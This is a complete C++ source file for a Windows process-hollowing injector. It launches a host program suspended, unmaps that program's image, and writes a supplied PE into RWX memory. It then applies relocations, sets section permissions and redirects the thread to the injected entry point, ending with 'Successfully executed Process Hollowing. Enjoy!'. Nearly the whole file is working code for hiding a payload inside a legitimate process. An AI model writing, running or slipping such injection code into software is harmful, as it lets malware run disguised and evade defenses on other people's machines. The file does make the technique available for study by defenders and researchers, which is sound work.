#include "processHollower.h"
#include "debug.h"


ProcessHollower::ProcessHollower() {
    dwGuestPEAddress = 0;
    pGuestPEHeaders = new PE_HEADERS;
    dwHostImageBaseAddress = 0;
    lpHostProcessInformation = new PROCESS_INFORMATION();
}

ProcessHollower::~ProcessHollower() {
    delete lpHostProcessInformation;
    lpHostProcessInformation = nullptr;
    delete pGuestPEHeaders;
    pGuestPEHeaders = nullptr;
}

BOOL ProcessHollower::execute(char *lpHostApplicationName, LPVOID lpGuestPEData) {
    DebugInfoMessage("Starting Process Hollowing");
    GetGuestPEData(lpGuestPEData);
    if (!CreateHostProcess(lpHostApplicationName))
        return FALSE;
    if (!GetHostProcessBaseAddress()) {
        TerminateHostProcess();
        return FALSE;
    }
    if (!UnmapHostProcessMemory()) {
        TerminateHostProcess();
        return FALSE;
    }
    if (!AllocateProcessMemory()) {
        TerminateHostProcess();
        return FALSE;
    }
    if (!InjectGuestPE()) {
        TerminateHostProcess();
        return FALSE;
    }
    if (!JumpToEntryPoint()) {
        TerminateHostProcess();
        return FALSE;
    }
    DebugSuccessMessage("Successfully executed Process Hollowing. Enjoy!");
    return TRUE;
}

VOID ProcessHollower::GetGuestPEData(LPVOID lpBuffer) {
    dwGuestPEAddress = (VIRTUAL_ADDRESS) lpBuffer;
    pGuestPEHeaders = LoadPEHeaders((VIRTUAL_ADDRESS) lpBuffer);
}

BOOL ProcessHollower::CreateHostProcess(char *lpHostApplicationName) {
    DebugInfoMessage("Creating Host Process");
    auto lpStartupInfo = new STARTUPINFOA();
    bool bSuccess = CreateProcess(lpHostApplicationName, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, lpStartupInfo, lpHostProcessInformation);
    if (!bSuccess)
        DebugErrorMessage("Failed to create Host Process");
    DebugSuccessMessage("Successfully created Host Process");
    DebugData("PID of host process", lpHostProcessInformation->dwProcessId, FORMAT_INT);
    return bSuccess;
}

BOOL ProcessHollower::GetHostProcessBaseAddress() {
    DebugInfoMessage("Reading Host Process PEB");
    PPEB pPEB = ReadRemotePEB(lpHostProcessInformation->hProcess);
    if (pPEB == nullptr) {
        DebugErrorMessage("Failed to read Remote PEB");
        return FALSE;
    }
    DebugSuccessMessage("Successfully read Host Process PEB");
    DebugData("Base Address of host process", (VIRTUAL_ADDRESS)pPEB->ImageBaseAddress, FORMAT_ADDRESS);
    dwHostImageBaseAddress = (VIRTUAL_ADDRESS)pPEB->ImageBaseAddress; // atencio! si no hi ha relocations caldra que agafem l'address del PE_HEADERS guest i sobreescrivim l'image base address del PEB!
    return TRUE;
}

BOOL ProcessHollower::UnmapHostProcessMemory() {
    DebugInfoMessage("Unmapping Host Process memory");
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    auto NtUnmapViewOfSection = (_NtUnmapViewOfSection) fpNtUnmapViewOfSection;
    DWORD dwStatus = NtUnmapViewOfSection(lpHostProcessInformation->hProcess, (PVOID)dwHostImageBaseAddress);
    if (dwStatus != STATUS_SUCCESS) {
        DebugErrorMessage("Failed to unmap Host Process memory");
        return FALSE;
    }
    DebugSuccessMessage("Successfully unmapped Host Process memory");
    return TRUE;
}

BOOL ProcessHollower::AllocateProcessMemory() {
    DebugInfoMessage("Allocating memory for Guest PE into Host Process");
    // if there are no relocations, process should be inserted in injected PE BaseAddress, and later change PEB base address field before jumping to entry point
    // attention lpBaseAddress might not be the same as dwHostImageBaseAddress and then we would not be considering the correct address!!
    LPVOID lpBaseAddress = VirtualAllocEx(lpHostProcessInformation->hProcess, (PVOID)dwHostImageBaseAddress, pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress == nullptr) {
        DebugErrorMessage("Failed to allocate memory for Guest PE into Host Process");
        return FALSE;
    }
    DebugSuccessMessage("Successfully allocated memory for Guest PE into Host Process");
    DebugData("Start address of allocated memory", (VIRTUAL_ADDRESS)lpBaseAddress, FORMAT_ADDRESS);
    return TRUE;
}

BOOL ProcessHollower::InjectGuestPE() {
    DebugInfoMessage("Injecting Guest PE into into Host Process");
    //what happens if it's negative?
    VIRTUAL_ADDRESS dwRelocationDelta = dwHostImageBaseAddress - pGuestPEHeaders->NTHeaders->OptionalHeader.ImageBase;
    pGuestPEHeaders->NTHeaders->OptionalHeader.ImageBase = (VIRTUAL_ADDRESS)dwHostImageBaseAddress;
    if (!WriteProcessSection(dwHostImageBaseAddress, (LPCVOID) dwGuestPEAddress, pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfHeaders)) {
        DebugErrorMessage("Failed to inject Guest PE headers");
        return FALSE;
    }

    for (DWORD i = 0; i < pGuestPEHeaders->NTHeaders->FileHeader.NumberOfSections; i++) {
        DebugData("Injecting section", (VIRTUAL_ADDRESS)pGuestPEHeaders->SectionHeaders[i].Name, FORMAT_SECTION);
        if (!pGuestPEHeaders->SectionHeaders[i].PointerToRawData)
            continue;
        VIRTUAL_ADDRESS pSectionDestination = dwHostImageBaseAddress + pGuestPEHeaders->SectionHeaders[i].VirtualAddress;
        if (!WriteProcessSection(pSectionDestination, (LPCVOID)(dwGuestPEAddress + pGuestPEHeaders->SectionHeaders[i].PointerToRawData), pGuestPEHeaders->SectionHeaders[i].SizeOfRawData)) {
            DebugErrorMessage("Failed to inject Guest PE section");
            return FALSE;
        }
    }
    DebugSuccessMessage("Successfully injected Guest PE into into Host Process");
    if (!ApplyRelocations(dwRelocationDelta))
        return FALSE;
    SetSectionsPermissions();
    return TRUE;
}

BOOL ProcessHollower::WriteProcessSection(VIRTUAL_ADDRESS lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize) {
    SIZE_T lpNumberOfBytesWritten;
    BOOL bSuccess = WriteProcessMemory(lpHostProcessInformation->hProcess, (PVOID)lpBaseAddress, lpBuffer, nSize, &lpNumberOfBytesWritten);
    return bSuccess && nSize == lpNumberOfBytesWritten;
}

DWORD ProcessHollower::findRelocationSection() {
    char SectionName[] = ".reloc";
    for (int i = 0; i < pGuestPEHeaders->NTHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(pGuestPEHeaders->SectionHeaders[i].Name, &SectionName, strlen(SectionName)) == 0)
            return i;
    }
    return -1;
}

BOOL ProcessHollower::ApplyRelocations(VIRTUAL_ADDRESS dwRelocationDelta) {
    PBASE_RELOCATION_BLOCK pBlockHeader;
    PBASE_RELOCATION_ENTRY pBlocks;
    int dwRelocationSection = findRelocationSection();
    if (dwRelocationSection == -1) {
        DebugInfoMessage("Relocation section was not found. No relocations will be applied");
        return TRUE;
    } if (dwRelocationDelta == 0) {
        DebugInfoMessage("No relocations are needed (relocation delta is zero)");
        return TRUE;
    }
    DebugInfoMessage("Applying relocations");
    DebugData("Relocation delta", dwRelocationDelta, FORMAT_ADDRESS);
    DWORD dwOffset = 0;
    IMAGE_DATA_DIRECTORY RelocationData = pGuestPEHeaders->NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    VIRTUAL_ADDRESS dwRelocationAddress = pGuestPEHeaders->SectionHeaders[dwRelocationSection].PointerToRawData;
    while (dwOffset < RelocationData.Size) {
        pBlockHeader = (PBASE_RELOCATION_BLOCK) (dwGuestPEAddress + dwRelocationAddress + dwOffset);
        dwOffset += sizeof(BASE_RELOCATION_BLOCK);
        pBlocks = (PBASE_RELOCATION_ENTRY) (dwGuestPEAddress + dwRelocationAddress + dwOffset);
        DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);
        if (!ApplyBlockRelocations(dwEntryCount, dwOffset, pBlocks, pBlockHeader, dwRelocationDelta)) {
            DebugErrorMessage("Failed to apply relocations");
            return FALSE;
        }
    }
    DebugSuccessMessage("Successfully applied relocations");
    return TRUE;
}

BOOL ProcessHollower::ApplyBlockRelocations(DWORD dwEntryCount, DWORD &dwOffset, PBASE_RELOCATION_ENTRY pBlocks, PBASE_RELOCATION_BLOCK pBlockHeader, VIRTUAL_ADDRESS dwRelocationDelta) {
    VIRTUAL_ADDRESS dwAddressToRelocate;
    VIRTUAL_ADDRESS dwAddressToRelocateValue = 0;
    for (DWORD entry = 0; entry < dwEntryCount; entry++) {
        if (pBlocks[entry].Type == 0) {
            dwOffset += sizeof(BASE_RELOCATION_ENTRY);
            continue;
        }
        dwAddressToRelocate = dwHostImageBaseAddress + pBlockHeader->PageAddress + pBlocks[entry].Offset;
        if (!ReadProcessMemory(lpHostProcessInformation->hProcess, (PVOID) dwAddressToRelocate, &dwAddressToRelocateValue, sizeof(VIRTUAL_ADDRESS), nullptr))
            return FALSE;
        dwAddressToRelocateValue += dwRelocationDelta;
        if (!WriteProcessMemory(lpHostProcessInformation->hProcess, (PVOID) dwAddressToRelocate, &dwAddressToRelocateValue, sizeof(VIRTUAL_ADDRESS), nullptr))
            return FALSE;
        dwOffset += sizeof(BASE_RELOCATION_ENTRY);
    }
    return TRUE;
}

BOOL ProcessHollower::SetSectionsPermissions() {
    DebugInfoMessage("Setting permissions for each section");
    DWORD dwFlOldProtect;
    DWORD dwMemProtectionFlag;
    if (!VirtualProtectEx(lpHostProcessInformation->hProcess, (LPVOID) dwHostImageBaseAddress,  pGuestPEHeaders->NTHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &dwFlOldProtect)) {
        DebugErrorMessage("Failed to set header permissions");
        return FALSE;
    }
    for (DWORD i = 0; i < pGuestPEHeaders->NTHeaders->FileHeader.NumberOfSections; i++) {
        if (!pGuestPEHeaders->SectionHeaders[i].PointerToRawData)
            continue;
        dwMemProtectionFlag = GetMemProtectionFlag(pGuestPEHeaders->SectionHeaders[i].Characteristics);
        if (!VirtualProtectEx(lpHostProcessInformation->hProcess, (LPVOID) (dwHostImageBaseAddress + pGuestPEHeaders->SectionHeaders[i].VirtualAddress),  pGuestPEHeaders->SectionHeaders[i].SizeOfRawData, dwMemProtectionFlag, &dwFlOldProtect)) {
            DebugErrorMessage("Failed to set permissions of a section");
            DebugData("Section", (VIRTUAL_ADDRESS)pGuestPEHeaders->SectionHeaders[i].Name, FORMAT_SECTION);
            return FALSE;
        }
    }
    DebugSuccessMessage("Successfully set permissions");
    return TRUE;
}

VOID ProcessHollower::SetEntryPoint(PCONTEXT pContext, VIRTUAL_ADDRESS dwEntrypoint) {
    #ifdef _WIN64
        pContext->Rcx = dwEntrypoint;
    #else
        pContext->Eax = dwEntrypoint;
    #endif
}

BOOL ProcessHollower::JumpToEntryPoint() {
    DebugInfoMessage("Setting process entry point and resuming execution");
    auto pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(lpHostProcessInformation->hThread, pContext)) {
        DebugErrorMessage("Failed to get Thread Context");
        return FALSE;
    }
    VIRTUAL_ADDRESS dwEntrypoint = dwHostImageBaseAddress + pGuestPEHeaders->NTHeaders->OptionalHeader.AddressOfEntryPoint;
    SetEntryPoint(pContext, dwEntrypoint);
    SetThreadContext(lpHostProcessInformation->hThread, pContext);
    if (!ResumeThread(lpHostProcessInformation->hThread)) {
        DebugErrorMessage("Failed to resume thread");
        return FALSE;
    }
    return TRUE;
}

VOID ProcessHollower::TerminateHostProcess() {
    TerminateProcess(lpHostProcessInformation->hProcess, -1);
}